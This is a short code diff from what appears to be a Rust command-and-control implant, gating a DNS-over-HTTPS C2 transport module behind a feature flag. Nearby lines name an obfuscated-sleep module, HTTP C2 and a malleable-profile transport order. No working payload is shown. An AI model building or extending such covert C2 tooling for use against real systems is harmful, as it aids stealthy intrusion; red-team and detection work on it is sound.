@@ -470,5 +470,6 @@ pub mod obfuscated_sleep;
 /// 2) the malleable profile enables that transport at runtime.
 ///
 /// Startup transport priority is: SSH > DoH > HTTP > TLS fallback.
+#[cfg(feature = "doh-transport")]
 pub mod c2_doh;
 pub mod c2_http;
